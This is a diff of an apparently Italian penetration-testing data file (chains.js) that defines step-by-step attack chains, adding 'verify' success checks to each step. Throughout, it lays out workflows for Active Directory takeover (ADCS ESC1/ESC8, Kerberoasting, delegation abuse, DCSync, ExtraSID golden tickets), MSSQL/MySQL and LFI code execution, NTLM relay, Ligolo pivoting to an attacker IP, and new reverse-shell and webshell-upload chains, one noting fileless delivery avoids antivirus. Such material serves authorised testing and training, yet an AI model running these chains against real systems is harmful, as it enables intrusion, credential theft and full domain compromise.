@@ -1,4 +1,4 @@
-/* chains.js — generato da Command Manager il 2026-07-08T13:54:02.513Z */
+/* chains.js — generato da WannaHack il 2026-07-08T13:54:02.513Z */
 const CHAINS = [
   {
     "id": "passive-subs",
@@ -24,35 +24,35 @@ const CHAINS = [
         "id": "s1",
         "title": "CT logs (crt.sh)",
         "cmdRef": "crtsh",
-        "rationale": "I certificati pubblici espongono sottodomini, anche dev/staging. Zero traffico al target.",
         "verify": "crtsh.txt non è vuoto."
       },
       {
         "id": "s2",
+        "verify": "`subfinder.txt` contiene i sottodomini trovati, uno per riga.",
         "title": "subfinder",
-        "cmdRef": "subfinder",
-        "rationale": "Aggrega decine di fonti passive oltre ai CT log."
+        "cmdRef": "subfinder"
       },
       {
         "id": "s3",
+        "verify": "`amass.txt` esiste e aggiunge nomi che le altre fonti non avevano restituito.",
         "title": "amass",
-        "cmdRef": "amass-passive",
-        "rationale": "Altre fonti ancora: amass trova spesso sub che gli altri perdono."
+        "cmdRef": "amass-passive"
       },
       {
         "id": "s4",
+        "verify": "`assetfinder.txt` è popolato.",
         "title": "assetfinder",
-        "cmdRef": "assetfinder",
-        "rationale": "Raccolta veloce extra — più fonti = più copertura."
+        "cmdRef": "assetfinder"
       },
       {
         "id": "s5",
+        "verify": "`chaos.txt` è popolato. Un file vuoto con errore di autenticazione indica una `PDCP_API_KEY` mancante o scaduta.",
         "title": "chaos",
-        "cmdRef": "chaos",
-        "rationale": "Interroga il dataset Chaos di ProjectDiscovery: sottodomini già raccolti da fonti pubbliche. Serve una API key gratuita (PDCP_API_KEY)."
+        "cmdRef": "chaos"
       },
       {
         "id": "s6",
+        "verify": "Vengono creati i file `harvest.xml` e `harvest.json` con host ed email raccolti.",
         "title": "theHarvester",
         "cmdRef": "theharvester",
         "cmd": {
@@ -82,14 +82,13 @@ const CHAINS = [
             }
           ]
         },
-        "variant": "default",
-        "rationale": "Estrae host e sottodomini da molte fonti OSINT; la variante tee salva theharvester.txt, così rientra nel merge finale."
+        "variant": "default"
       },
       {
         "id": "s7",
+        "verify": "`resolved.txt` elenca solo gli host con record A, quindi ha meno righe del file unito di partenza.",
         "title": "Unisci e risolvi",
-        "cmdRef": "dnsx-resolve",
-        "rationale": "cat di tutti i .txt, dedup e risoluzione: tieni solo gli host vivi con record A."
+        "cmdRef": "dnsx-resolve"
       }
     ]
   },
@@ -118,45 +117,42 @@ const CHAINS = [
       {
         "id": "s1",
         "title": "Registrazione e nameserver",
-        "cmdRef": "whois-domain",
-        "rationale": "Registrar, date e record NS: i nameserver rivelano il provider DNS/hosting."
+        "cmdRef": "whois-domain"
       },
       {
         "id": "s2",
+        "verify": "Per ogni tipo interrogato compare la sezione ANSWER. I record MX e TXT rivelano provider di posta e servizi SaaS in uso.",
         "title": "Record DNS",
-        "cmdRef": "dig-records",
-        "rationale": "MX/TXT rivelano il mail provider, SPF/DKIM e i SaaS usati dall’organizzazione."
+        "cmdRef": "dig-records"
       },
       {
         "id": "s3",
         "title": "Sottodomini dai CT logs",
         "cmdRef": "crtsh",
-        "rationale": "I Certificate Transparency espongono sottodomini (anche dev/staging) senza traffico al target.",
         "verify": "crtsh.txt non è vuoto."
       },
       {
         "id": "s4",
+        "verify": "`subfinder.txt` aggiunge nomi non presenti fra quelli estratti dai CT log.",
         "title": "Aggrega altri sottodomini",
-        "cmdRef": "subfinder",
-        "rationale": "Aggiunge fonti passive oltre ai CT log. Unisci con crt.sh / amass / assetfinder in all_subs.txt."
+        "cmdRef": "subfinder"
       },
       {
         "id": "s5",
+        "verify": "`resolved.txt` contiene le coppie host e indirizzo IP dei soli host attivi.",
         "title": "Risolvi agli host vivi",
-        "cmdRef": "dnsx-resolve",
-        "rationale": "Trasforma la lista unita in record A vivi: diventa la lista target della fase active."
+        "cmdRef": "dnsx-resolve"
       },
       {
         "id": "s6",
+        "verify": "L'output elenca indirizzi email da cui si deduce la convenzione di naming, per esempio `nome.cognome@`.",
         "title": "Email e naming convention",
-        "cmdRef": "theharvester",
-        "rationale": "Le email raccolte rivelano il pattern username (n.cognome, nome.cognome…) per lo spraying."
+        "cmdRef": "theharvester"
       },
       {
         "id": "s7",
         "title": "Servizi esposti (no touch)",
-        "cmdRef": "shodan-host",
-        "rationale": "Scegli un IP vivo dallo step 5 (mettilo nel Target). Shodan mostra porte/CVE senza scansionare."
+        "cmdRef": "shodan-host"
       }
     ]
   },
@@ -185,7 +181,6 @@ const CHAINS = [
         "id": "s1",
         "title": "Enumera i template ADCS vulnerabili",
         "cmdRef": "certipy-find",
-        "rationale": "Elenca le CA e segnala i template che permettono client auth, enrollment poco privilegiato e SAN a piacere. Cerca ESC1 nell'output.",
         "verify": "Nel report di certipy compare il tag \"ESC1\"."
       },
       {
@@ -195,25 +190,23 @@ const CHAINS = [
         "overrides": {
           "upn": "administrator@<domain>"
         },
-        "rationale": "Imposti SAN UPN=administrator e la CA emette un certificato per l'identità DA.",
         "verify": "`Got certificate with UPN administrator@…`"
       },
       {
         "id": "s3",
         "title": "PKINIT: TGT e NT hash",
         "cmdRef": "certipy-auth",
-        "rationale": "Ti autentichi come Administrator con il certificato. Certipy ricava anche l'NT hash via U2U.",
         "verify": "`Got hash for administrator@…`"
       },
       {
         "id": "s4",
+        "verify": "Il dump parte da `Administrator:500:` con il relativo hash NT e prosegue con tutti gli account di dominio.",
         "title": "Conferma DA con DCSync",
         "cmdRef": "secretsdump",
         "overrides": {
           "user": "administrator",
           "password": ":<hash>"
-        },
-        "rationale": "Replichi il krbtgt per provare l'accesso da DA e lo salvi per i Golden Ticket futuri."
+        }
       }
     ]
   },
@@ -240,38 +233,37 @@ const CHAINS = [
     "steps": [
       {
         "id": "s1",
+        "verify": "Nel report di certipy compare il tag `ESC8` sull'endpoint web di enrollment.",
         "title": "Conferma l'esposizione a ESC8",
-        "cmdRef": "certipy-find",
-        "rationale": "Verifica che il WebEnrollment sia raggiungibile e che il template `DomainController` sia richiedibile dai Domain Computers."
+        "cmdRef": "certipy-find"
       },
       {
         "id": "s2",
+        "verify": "ntlmrelayx segnala `Servers started, waiting for connections`.",
         "title": "Avvia ntlmrelayx verso /certsrv",
-        "cmdRef": "ntlmrelayx-adcs",
-        "rationale": "Lascialo in ascolto: a relay riuscito registra un PFX in Base64 per l'account rilanciato."
+        "cmdRef": "ntlmrelayx-adcs"
       },
       {
         "id": "s3",
         "title": "Forza il DC ad autenticarsi",
         "cmdRef": "coercer",
-        "rationale": "PetitPotam / MS-RPRN / DFSCoerce costringono il `DC$` ad autenticarsi verso il tuo listener.",
         "verify": "`Authenticating against http://… as CORP/DC01$ SUCCEED`"
       },
       {
         "id": "s4",
+        "verify": "`Got hash for 'dc01$@corp.local'`, cioè l'hash NT del computer account del domain controller.",
         "title": "Converti il certificato in TGT per il DC$",
-        "cmdRef": "certipy-auth",
-        "rationale": "PKINIT con il certificato del `DC$` restituisce un TGT e l'NT hash del `DC$`."
+        "cmdRef": "certipy-auth"
       },
       {
         "id": "s5",
+        "verify": "Il dump parte da `Administrator:500:` benché l'autenticazione sia avvenuta come account macchina.",
         "title": "DCSync come DC$",
         "cmdRef": "secretsdump",
         "overrides": {
           "user": "DC01$",
           "password": ""
-        },
-        "rationale": "Gli account computer dei DC hanno i diritti di replica: estrai il krbtgt e hai chiuso."
+        }
       }
     ]
   },
@@ -297,32 +289,34 @@ const CHAINS = [
     "steps": [
       {
         "id": "s1",
+        "verify": "Le righe `[+] VALID USERNAME:` elencano gli account realmente esistenti, mentre gli altri vengono scartati.",
         "title": "Enumera gli utenti di dominio validi",
         "cmdRef": "kerbrute-userenum"
       },
       {
         "id": "s2",
+        "verify": "`asrep.txt` contiene hash che iniziano con `$krb5asrep$23$`. Un file vuoto significa che nessun account ha la pre-autenticazione disabilitata.",
         "title": "AS-REP roast degli account senza pre-auth",
-        "cmdRef": "getnpusers",
-        "rationale": "Gli account con DONT_REQ_PREAUTH espongono un AS-REP cifrato con la chiave dell'utente, crackabile offline."
+        "cmdRef": "getnpusers"
       },
       {
         "id": "s3",
+        "verify": "hashcat riporta `Status...: Cracked` e la password compare in coda alla riga dell'hash. Per l'AS-REP il mode corretto è 18200.",
         "title": "Cracka l'AS-REP (hashcat 18200)",
         "cmdRef": "hashcat-ntlm",
         "overrides": {
           "mode": "18200"
-        },
-        "rationale": "Mode 18200 per l'AS-REP. Basta una password craccata per il passo dopo."
+        }
       },
       {
         "id": "s4",
+        "verify": "`kerb.txt` contiene hash che iniziano con `$krb5tgs$23$*`, uno per ogni account di servizio con SPN registrato.",
         "title": "Kerberoast degli account con SPN",
-        "cmdRef": "getuserspns",
-        "rationale": "Autenticato come l'utente craccato, richiedi i TGS di ogni SPN."
+        "cmdRef": "getuserspns"
       },
       {
         "id": "s5",
+        "verify": "Qui il mode è 13100. La password recuperata va poi provata contro un account che in BloodHound risulti avere i diritti di replica.",
         "title": "Cracka e trova un account con diritti DCSync",
         "cmdRef": "hashcat-ntlm",
         "overrides": {
@@ -331,9 +325,9 @@ const CHAINS = [
       },
       {
         "id": "s6",
+        "verify": "Il dump elenca gli hash NT di tutto il dominio a partire da `Administrator:500:`, incluso `krbtgt`.",
         "title": "DCSync",
-        "cmdRef": "secretsdump",
-        "rationale": "Lancialo con l'account privilegiato trovato."
+        "cmdRef": "secretsdump"
       }
     ]
   },
@@ -359,15 +353,15 @@ const CHAINS = [
     "steps": [
       {
         "id": "s1",
+        "verify": "Viene prodotto uno zip di file JSON. Caricato in BloodHound, un arco `GenericWrite` o `GenericAll` verso il computer target conferma la fattibilità.",
         "title": "Conferma l'ACL con BloodHound",
-        "cmdRef": "bloodhound-py",
-        "rationale": "Lancia una query sull'edge AddAllowedToAct per confermare il percorso."
+        "cmdRef": "bloodhound-py"
       },
       {
         "id": "s2",
+        "verify": "`Successfully added machine account`. Il quota di default consente dieci computer per utente, quindi il limite può essere già esaurito.",
         "title": "Crea un computer account che controlli",
-        "cmdRef": "addcomputer",
-        "rationale": "Consuma uno slot del MAQ per avere un SPN sotto il tuo controllo."
+        "cmdRef": "addcomputer"
       },
       {
         "id": "s3",
@@ -377,23 +371,23 @@ const CHAINS = [
       },
       {
         "id": "s4",
+        "verify": "Le righe `Impersonating administrator` e `Saving ticket in administrator.ccache`. Il ticket va poi esportato con `export KRB5CCNAME=administrator.ccache`.",
         "title": "S4U2Self + S4U2Proxy come Administrator",
         "cmdRef": "getst-s4u",
         "overrides": {
           "impersonate": "administrator"
-        },
-        "rationale": "Forgia un TGS per cifs/<victim>.<domain> come Administrator."
+        }
       },
       {
         "id": "s5",
+        "verify": "Si apre il prompt `C:\\Windows\\system32>` e `whoami` restituisce `nt authority\\system`.",
         "title": "PSExec con il ticket",
         "cmdRef": "psexec",
         "overrides": {
           "ip": "<victim>.<domain>",
           "user": "administrator",
           "password": ""
-        },
-        "rationale": "Usa `-k -no-pass` con KRB5CCNAME che punta al ccache."
+        }
       }
     ]
   },
@@ -418,17 +412,19 @@ const CHAINS = [
     "steps": [
       {
         "id": "s1",
+        "verify": "Il prompt passa a `SQL>`. Un login rifiutato indica credenziali errate oppure autenticazione Windows richiesta.",
         "title": "Connessione",
         "cmdRef": "mssql-login"
       },
       {
         "id": "s2",
+        "verify": "Un valore di ritorno `1` conferma il ruolo sysadmin, mentre `0` obbliga a passare alla via dell'impersonation.",
         "title": "Verifica ruolo",
-        "cmdRef": "mssql-roles",
-        "rationale": "`SELECT IS_SRVROLEMEMBER('sysadmin')`: torna `1` = sei sysadmin, vai a xp_cmdshell (s3); `0` = non sysadmin, passa all'impersonation (s4) e prima enumera i login impersonabili (variante 'Chi posso impersonare')."
+        "cmdRef": "mssql-roles"
       },
       {
         "id": "s3",
+        "verify": "Il comando restituisce l'output nella griglia dei risultati. Il messaggio `SQL Server blocked access to procedure` indica che la riconfigurazione non è andata a buon fine.",
         "title": "xp_cmdshell RCE (via sysadmin)",
         "cmdRef": "mssql-xpcmdshell",
         "overrides": {
@@ -437,9 +433,9 @@ const CHAINS = [
       },
       {
         "id": "s4",
+        "verify": "`SELECT SYSTEM_USER` restituisce `sa` invece dell'utente originale, quindi l'impersonation è attiva.",
         "title": "Oppure: impersona sa (senza sysadmin)",
-        "cmdRef": "mssql-impersonate",
-        "rationale": "Se non sei sysadmin: SELECT dei permessi IMPERSONATE, poi EXECUTE AS LOGIN."
+        "cmdRef": "mssql-impersonate"
       }
     ]
   },
@@ -464,21 +460,21 @@ const CHAINS = [
     "steps": [
       {
         "id": "s1",
+        "verify": "Il prompt passa a `mysql>`.",
         "title": "Connessione",
         "cmdRef": "mysql-login"
       },
       {
         "id": "s2",
         "title": "Verifica prerequisiti RCE",
-        "cmdRef": "mysql-privcheck",
-        "rationale": "Serve `FILE` privilege e `secure_file_priv` diverso da `NULL`. Se `secure_file_priv` è `NULL`, questa via è morta: cerca un altro vettore (exploit app, credential reuse)."
+        "cmdRef": "mysql-privcheck"
       },
       {
         "id": "s3",
+        "verify": "`Query OK` e il file compare sotto la webroot. Servono il privilegio FILE e una webroot scrivibile dall'utente del database.",
         "title": "RCE",
         "cmdRef": "mysql-oscmd",
-        "variant": "outfile",
-        "rationale": "Se conosci il webroot ed è scrivibile: scrivi la webshell, poi RCE via HTTP (`sh.php?cmd=id`)."
+        "variant": "outfile"
       }
     ]
   },
@@ -504,12 +500,13 @@ const CHAINS = [
     "steps": [
       {
         "id": "s1",
+        "verify": "La risposta contiene il contenuto di `/etc/passwd`, quindi l'inclusione arbitraria di file è confermata.",
         "title": "Conferma la LFI",
-        "cmdRef": "lfi",
-        "rationale": "Leggi `/etc/passwd` per confermare il path traversal e capire la profondità."
+        "cmdRef": "lfi"
       },
       {
         "id": "s2",
+        "verify": "La richiesta viene registrata nel log di access con lo User-Agent malevolo. Il percorso varia fra `/var/log/apache2/access.log` e `/var/log/nginx/access.log` e deve essere leggibile.",
         "title": "Inietta PHP nel log (User-Agent)",
         "cmdRef": "lfi-logpoison",
         "cmd": {
@@ -533,11 +530,11 @@ const CHAINS = [
             }
           ]
         },
-        "variant": "default",
-        "rationale": "Il payload nello User-Agent finisce nell’access.log del web server."
+        "variant": "default"
       },
       {
         "id": "s3",
+        "verify": "Includendo il log e passando il parametro `cmd`, l'output del comando compare nella pagina e conferma l'esecuzione.",
         "title": "Includi il log ed esegui",
         "cmdRef": "lfi-logpoison",
         "cmd": {
@@ -567,8 +564,7 @@ const CHAINS = [
             }
           ]
         },
-        "variant": "trigger",
-        "rationale": "Includendo il log via LFI, il PHP iniettato viene eseguito; `cmd=` passa il comando."
+        "variant": "trigger"
       }
     ]
   },
@@ -593,25 +589,25 @@ const CHAINS = [
     "steps": [
       {
         "id": "s1",
+        "verify": "`kerb.txt` contiene almeno un hash `$krb5tgs$23$*`. L'assenza di risultati significa che nessun account utente ha un SPN registrato.",
         "title": "Richiedi i TGS (Kerberoast)",
-        "cmdRef": "getuserspns",
-        "rationale": "Salva gli hash in `kerb.txt`; i service account hanno spesso password deboli."
+        "cmdRef": "getuserspns"
       },
       {
         "id": "s2",
+        "verify": "`Status...: Cracked` con il mode 13100 e la password in chiaro accanto all'hash.",
         "title": "Cracka offline",
         "cmdRef": "hashcat-ntlm",
         "overrides": {
           "mode": "13100",
           "hashfile": "kerb.txt"
-        },
-        "rationale": "Mode `13100` = TGS Kerberoast."
+        }
       },
       {
         "id": "s3",
+        "verify": "La shell si apre come l'account di servizio compromesso e `whoami` ne conferma l'identità.",
         "title": "Riusa le credenziali",
-        "cmdRef": "psexec",
-        "rationale": "Prova la password sui servizi (SMB/WinRM): se il service account è admin da qualche parte, è game over."
+        "cmdRef": "psexec"
       }
     ]
   },
@@ -636,22 +632,22 @@ const CHAINS = [
     "steps": [
       {
         "id": "s1",
-        "title": "Trova i target senza SMB signing",
-        "rationale": "Genera la lista relay: `nxc smb <range> --gen-relay-list targets.txt` (signing:False)."
+        "verify": "L'elenco riporta gli host con `signing:False`, che sono gli unici bersagli validi per il relay.",
+        "title": "Trova i target senza SMB signing"
       },
       {
         "id": "s2",
+        "verify": "Compare `[SMB] NTLMv2-SSP Hash` con l'hash dell'utente che ha risolto il nome. Gli hash vengono salvati anche in `/usr/share/responder/logs/`.",
         "title": "Avvelena e cattura",
         "cmdRef": "responder",
-        "variant": "default",
-        "rationale": "Cattura i NetNTLMv2 di chi cerca host inesistenti."
+        "variant": "default"
       },
       {
         "id": "s3",
+        "verify": "`Authenticating against smb://… SUCCEED` seguito da `Started interactive SMB client shell`. Responder va avviato con SMB e HTTP disabilitati per non intercettare la connessione destinata al relay.",
         "title": "Oppure rilancia (relay)",
         "cmdRef": "ntlmrelayx-smb",
-        "variant": "default",
-        "rationale": "Disabilita SMB/HTTP in `Responder.conf`, poi relaya verso i target senza signing per una shell o un dump SAM."
+        "variant": "default"
       }
     ]
   },
@@ -677,21 +673,21 @@ const CHAINS = [
     "steps": [
       {
         "id": "s1",
+        "verify": "Il dump riporta la riga `krbtgt:502:` con l'hash NT necessario a forgiare il ticket.",
         "title": "Dump del krbtgt del child",
-        "cmdRef": "dcsync",
-        "rationale": "Con i diritti di replica sul child estrai l'hash del `krbtgt` (`-just-dc-user krbtgt`): è la chiave per forgiare ticket nel child."
+        "cmdRef": "dcsync"
       },
       {
         "id": "s2",
+        "verify": "`Saving ticket in hacker.ccache`. Il SID del dominio padre va indicato con il suffisso `-519`, che identifica il gruppo Enterprise Admins.",
         "title": "Forgia il Golden Ticket con ExtraSID",
-        "cmdRef": "trust-extrasid",
-        "rationale": "Ti servono il SID del child e quello degli Enterprise Admins del parent (`<parentsid>-519`, da `impacket-lookupsid`). Inietti il `-519` come ExtraSID: il KDC del parent lo accetta come Enterprise Admin."
+        "cmdRef": "trust-extrasid"
       },
       {
         "id": "s3",
+        "verify": "La shell si apre sul domain controller del dominio padre e `whoami /groups` mostra l'appartenenza a Enterprise Admins.",
         "title": "Accedi al parent DC",
-        "cmdRef": "psexec",
-        "rationale": "Usa il ticket (`export KRB5CCNAME=...` e `-k -no-pass`) per una shell sul DC del parent. Shortcut: `impacket-raiseChild` fa tutti i passi in uno."
+        "cmdRef": "psexec"
       }
     ]
   },
@@ -718,21 +714,21 @@ const CHAINS = [
     "steps": [
       {
         "id": "s1",
+        "verify": "Il monitor resta in ascolto e stampa i TGT via via che finiscono nella cache della macchina con delega non vincolata.",
         "title": "Monitora i TGT in arrivo",
-        "cmdRef": "unconstrained-deleg",
-        "rationale": "Sulla macchina compromessa avvii il monitor (`Rubeus monitor`): ogni TGT che arriva viene catturato."
+        "cmdRef": "unconstrained-deleg"
       },
       {
         "id": "s2",
+        "verify": "`Authenticating against … SUCCEED` e sul monitor compare il TGT del computer account del domain controller.",
         "title": "Forza il DC ad autenticarsi",
-        "cmdRef": "coercer",
-        "rationale": "PetitPotam o PrinterBug costringono il `DC$` ad autenticarsi verso di te: il suo TGT finisce nel monitor."
+        "cmdRef": "coercer"
       },
       {
         "id": "s3",
+        "verify": "Con il TGT del DC iniettato in `KRB5CCNAME`, il dump degli hash di dominio va a buon fine partendo da `Administrator:500:`.",
         "title": "Inietta il TGT del DC$ e fai DCSync",
-        "cmdRef": "dcsync",
-        "rationale": "Con `Rubeus ptt` inietti il TGT del `DC$` in memoria, poi replichi gli hash del dominio: il `DC$` ha i diritti di replica."
+        "cmdRef": "dcsync"
       }
     ]
   },
@@ -758,27 +754,27 @@ const CHAINS = [
     "steps": [
       {
         "id": "s1",
+        "verify": "Lo zip viene prodotto e, caricato in BloodHound, la query Shortest Path to Domain Admins evidenzia un percorso percorribile dall'utente controllato.",
         "title": "Mappa il dominio con BloodHound",
-        "cmdRef": "bloodhound-py",
-        "rationale": "Raccogli tutti gli edge e cerca `Shortest Path to Domain Admin` e i diritti ACL sfruttabili dal tuo utente."
+        "cmdRef": "bloodhound-py"
       },
       {
         "id": "s2",
+        "verify": "bloodyAD conferma la modifica. Il valore precedente non è recuperabile, quindi la password cambiata va segnalata nel report.",
         "title": "Abusa l'ACL lungo il path",
-        "cmdRef": "acl-abuse",
-        "rationale": "ForceChangePassword, GenericWrite o AddMember per prendere il controllo dell'account successivo sul percorso."
+        "cmdRef": "acl-abuse"
       },
       {
         "id": "s3",
+        "verify": "L'operazione va a buon fine e in BloodHound compaiono gli archi `GetChanges` e `GetChangesAll` verso il dominio.",
         "title": "Concediti i diritti di replica",
-        "cmdRef": "writedacl-dcsync",
-        "rationale": "Se il path arriva a `WriteDACL` sul dominio, aggiungi i diritti DCSync al tuo account."
+        "cmdRef": "writedacl-dcsync"
       },
       {
         "id": "s4",
+        "verify": "Il dump parte da `Administrator:500:`. I diritti concessi al passo precedente vanno rimossi a fine attività con `remove dcsync`.",
         "title": "DCSync e cleanup",
-        "cmdRef": "dcsync",
-        "rationale": "Estrai gli hash del dominio, poi rimuovi i diritti aggiunti per pulire."
+        "cmdRef": "dcsync"
       }
     ]
   },
@@ -803,30 +799,32 @@ const CHAINS = [
     "steps": [
       {
         "id": "s1",
+        "verify": "La pagina risponde in modo diverso rispetto al valore legittimo, per esempio restituendo tutte le righe oppure un errore SQL.",
         "title": "Conferma l’iniezione",
-        "cmdRef": "sqli-detect",
-        "rationale": "Boolean o time-based per confermare prima di automatizzare."
+        "cmdRef": "sqli-detect"
       },
       {
         "id": "s2",
+        "verify": "sqlmap elenca i database sotto `available databases`. Se dichiara il parametro non iniettabile vanno alzati `--level` e `--risk`.",
         "title": "Enumera i database",
         "cmdRef": "sqlmap",
         "variant": "default"
       },
       {
         "id": "s3",
+        "verify": "Il contenuto della tabella viene salvato sotto `~/.local/share/sqlmap/output/<host>/dump/`.",
         "title": "Dumpa la tabella utenti",
         "cmdRef": "sqlmap",
         "variant": "dump"
       },
       {
         "id": "s4",
+        "verify": "`Status...: Cracked`. Il mode va scelto in base al formato osservato, per esempio 0 per MD5 e 1400 per SHA-256.",
         "title": "Cracka se hashate, poi riusa",
         "cmdRef": "hashcat-ntlm",
         "overrides": {
           "mode": "0"
-        },
-        "rationale": "Identifica il tipo di hash (es. `0` MD5) e crackalo; poi riusa le credenziali su login/SSH/SMB."
+        }
       }
     ]
   },
@@ -852,6 +850,7 @@ const CHAINS = [
     "steps": [
       {
         "id": "s1",
+        "verify": "`ip addr` elenca l'interfaccia `ligolo`, che resta in stato DOWN finché il tunnel non viene avviato.",
         "title": "Crea l'interfaccia TUN (Kali)",
         "cmd": {
           "name": "Ligolo — interfaccia TUN",
@@ -862,32 +861,54 @@ const CHAINS = [
       },
       {
         "id": "s2",
+        "verify": "L'agent è presente sul ponte ed è eseguibile.",
         "title": "Scarica e invia l'agent al ponte",
         "cmd": {
           "name": "scp — invia l'agent",
           "description": "Scarica l'agent adatto al sistema che farà da ponte (dalle release GitHub). Dopodiché lo invii al target ponte tramite `scp`, se hai una connessione SSH.",
           "template": "scp <agent> <user>@<pivot>:/tmp",
           "params": [
-            { "key": "agent", "label": "Path agent", "placeholder": "./agent" },
-            { "key": "user", "label": "User ponte", "ctx": "user", "placeholder": "jbetty" },
-            { "key": "pivot", "label": "IP ponte", "ctx": "ip", "placeholder": "10.129.170.173" }
+            {
+              "key": "agent",
+              "label": "Path agent",
+              "placeholder": "./agent"
+            },
+            {
+              "key": "user",
+              "label": "User ponte",
+              "ctx": "user",
+              "placeholder": "jbetty"
+            },
+            {
+              "key": "pivot",
+              "label": "IP ponte",
+              "ctx": "ip",
+              "placeholder": "10.129.170.173"
+            }
           ]
         }
       },
       {
         "id": "s3",
+        "verify": "Nella console del proxy compare `Agent joined` con nome host e utente dell'agent.",
         "title": "Avvia proxy (Kali) e agent (ponte)",
         "cmd": {
           "name": "Ligolo — proxy + agent",
           "description": "Su Kali avvii `ligolo-proxy` con certificati autofirmati; sulla macchina ponte avvii l'agent, che si connette al proxy. Una volta connessi all'agente, il comando `help` mostra cosa puoi fare.",
           "template": "# Su Kali (proxy) con certificati autofirmati:\nligolo-ng -selfcert\n\n# Sul ponte (agent), 11601 è la porta di default; in VPN usa l'IP della VPN:\n./agent -connect <ip_attacker>:11601 -ignore-cert",
           "params": [
-            { "key": "ip_attacker", "label": "IP attacker", "ctx": "ip", "placeholder": "10.10.14.5" }
+            {
+              "key": "ip_attacker",
+              "label": "IP attacker",
+              "ctx": "ip",
+              "placeholder": "10.10.14.5"
+            }
           ]
         }
       },
       {
         "id": "s4",
+        "verify": "Il comando elenca le sessioni disponibili e dopo la selezione il prompt riporta il contesto di quella scelta.",
         "title": "Seleziona la sessione",
         "cmd": {
           "name": "Ligolo — session",
@@ -898,15 +919,831 @@ const CHAINS = [
       },
       {
         "id": "s5",
+        "verify": "Dopo `start` l'interfaccia `ligolo` passa a UP e gli host della rete interna rispondono da Kali senza altra configurazione.",
         "title": "Aggiungi la route e start",
         "cmd": {
           "name": "Ligolo — route + start",
           "description": "Aggiungi una voce alla tabella di routing così Ligolo instrada il traffico nel tunnel verso la rete di destinazione, poi dalla console digiti `start`. Ora puoi eseguire qualsiasi strumento da Kali per interagire con la rete interna, come se fossi connesso direttamente.",
           "template": "# <internal_net> nel formato x.x.x.x/xx (es. 172.16.119.0/24):\nsudo ip route add <internal_net> dev ligolo\n\n# poi nella console ligolo-ng:\nstart",
           "params": [
-            { "key": "internal_net", "label": "Rete interna", "placeholder": "172.16.119.0/24" }
+            {
+              "key": "internal_net",
+              "label": "Rete interna",
+              "placeholder": "172.16.119.0/24"
+            }
           ]
         }
+      }
+    ]
+  },
+  {
+    "id": "payload-to-shell",
+    "name": "Payload → Listener → Shell stabile",
+    "short": "payload",
+    "category": "exploitation",
+    "subcategory": "payloads",
+    "tactic": "Execution",
+    "difficulty": "easy",
+    "estTime": "15 min",
+    "objective": "Trasformare una esecuzione di comandi qualsiasi in una shell interattiva utilizzabile. Il flusso è sempre lo stesso: si genera il payload nel formato adatto al target, si mette in ascolto un listener, si consegna ed esegue il payload e infine si stabilizza la shell, perché una shell non stabilizzata muore al primo Ctrl+C e non gestisce editor né sudo.",
+    "outcome": "Shell interattiva e stabile sul target",
+    "prereqs": [
+      "Un modo per eseguire comandi sul target, anche limitato",
+      "Connettività di rete dal target verso la macchina attaccante",
+      "Il formato del payload deve corrispondere al sistema operativo e all'architettura"
+    ],
+    "mitre": [
+      "T1059",
+      "T1105"
+    ],
+    "steps": [
+      {
+        "id": "s1",
+        "title": "Generazione del payload",
+        "cmdRef": "msfvenom",
+        "variant": "default",
+        "verify": "Il file viene creato e `file shell.elf` ne conferma architettura e formato. La dimensione anomala di pochi byte indica un errore nella generazione."
+      },
+      {
+        "id": "s2",
+        "title": "Listener in ascolto",
+        "cmdRef": "nc-listen",
+        "variant": "default",
+        "verify": "Il listener resta in attesa senza restituire il prompt. `ss -lntp` conferma la porta in stato LISTEN."
+      },
+      {
+        "id": "s3",
+        "title": "Consegna del payload al target",
+        "cmdRef": "transfer-http",
+        "variant": "default",
+        "verify": "Il log del server HTTP registra la richiesta GET con codice `200` proveniente dall'IP del target."
+      },
+      {
+        "id": "s4",
+        "title": "Alternativa senza file, one-liner",
+        "cmdRef": "revshell",
+        "variant": "default",
+        "verify": "La connessione arriva sul listener senza che nulla sia stato scritto su disco, il che evita del tutto l'antivirus su filesystem."
+      },
+      {
+        "id": "s5",
+        "title": "Stabilizzazione della shell",
+        "cmdRef": "shell-pty",
+        "variant": "full",
+        "verify": "Dopo l'upgrade funzionano Ctrl+C senza chiudere la sessione, la cronologia con le frecce, `clear` e gli editor a schermo intero."
+      },
+      {
+        "id": "s6",
+        "title": "Handler Metasploit per meterpreter",
+        "cmdRef": "msf-handler",
+        "verify": "`Meterpreter session 1 opened`. Da lì `getuid` e `sysinfo` confermano contesto utente e sistema operativo."
+      }
+    ]
+  },
+  {
+    "id": "webshell-to-shell",
+    "name": "Upload → Web Shell → Reverse Shell",
+    "short": "webshell",
+    "category": "exploitation",
+    "subcategory": "webshells",
+    "tactic": "Persistence",
+    "difficulty": "medium",
+    "estTime": "20 min",
+    "objective": "Passare da un form di upload mal filtrato a una shell interattiva. La web shell serve da testa di ponte, perché vive dentro il processo del web server e ne eredita i privilegi, ma resta scomoda: il passo successivo è sempre convertirla in una reverse shell vera.",
+    "outcome": "Reverse shell come utente del web server",
+    "prereqs": [
+      "Un punto di upload raggiungibile e una directory di destinazione servita dal web server",
+      "Conoscenza del linguaggio lato server, per scegliere l'estensione giusta",
+      "Connettività in uscita dal target verso la macchina attaccante"
+    ],
+    "mitre": [
+      "T1505.003",
+      "T1059"
+    ],
+    "steps": [
+      {
+        "id": "s1",
+        "title": "Bypass dei controlli di estensione",
+        "cmdRef": "file-upload",
+        "variant": "ext",
+        "verify": "L'upload viene accettato e il file risulta raggiungibile via HTTP. Un `403` sulla directory di upload indica che l'esecuzione è disabilitata e serve un'altra destinazione."
+      },
+      {
+        "id": "s2",
+        "title": "Bypass basato sui magic bytes",
+        "cmdRef": "file-upload",
+        "variant": "magic",
+        "verify": "Il file supera la validazione sul contenuto pur restando eseguibile lato server."
+      },
+      {
+        "id": "s3",
+        "title": "Web shell da caricare",
+        "cmdRef": "kali-webshells",
+        "variant": "default",
+        "verify": "Richiamando la web shell con il parametro previsto, per esempio `?cmd=id`, la risposta contiene l'output del comando."
+      },
+      {
+        "id": "s4",
+        "title": "Listener in ascolto",
+        "cmdRef": "nc-listen",
+        "variant": "default",
+        "verify": "Il listener resta in attesa sulla porta scelta."
+      },
+      {
+        "id": "s5",
+        "title": "Reverse shell dalla web shell",
+        "cmdRef": "revshell",
+        "variant": "php",
+        "verify": "La connessione arriva sul listener e `id` restituisce l'utente del web server, tipicamente `www-data` o `apache`."
+      },
+      {
+        "id": "s6",
+        "title": "Stabilizzazione della shell",
+        "cmdRef": "shell-pty",
+        "variant": "full",
+        "verify": "La sessione regge Ctrl+C, cronologia ed editor interattivi."
+      }
+    ]
+  },
